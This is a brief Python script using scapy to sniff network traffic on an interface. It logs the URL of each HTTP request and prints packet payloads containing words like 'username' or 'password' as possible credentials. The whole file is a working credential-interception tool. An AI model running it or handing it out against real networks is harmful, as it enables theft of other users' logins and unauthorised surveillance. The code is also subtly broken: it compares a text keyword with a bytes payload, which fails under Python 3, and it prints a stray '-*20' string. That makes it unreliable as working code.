#! /usr/bin/python3

import scapy.all as scapy
from scapy.layers import http


def start_sniff(interface):
    scapy.sniff(iface=interface, store=False,
                prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = sniff_url_requests(packet)
        print(f'[+] HTTP Request >> {url}')

        credentials = sniff_credentials(packet)

        if credentials:
            print(f'-*20 [+] Possible user credentials >> {credentials}')


def sniff_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ['username', 'user', 'login', 'password', 'pass']

        for keyword in keywords:
            if keyword in load:
                return load


def sniff_url_requests(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


start_sniff('eth0')
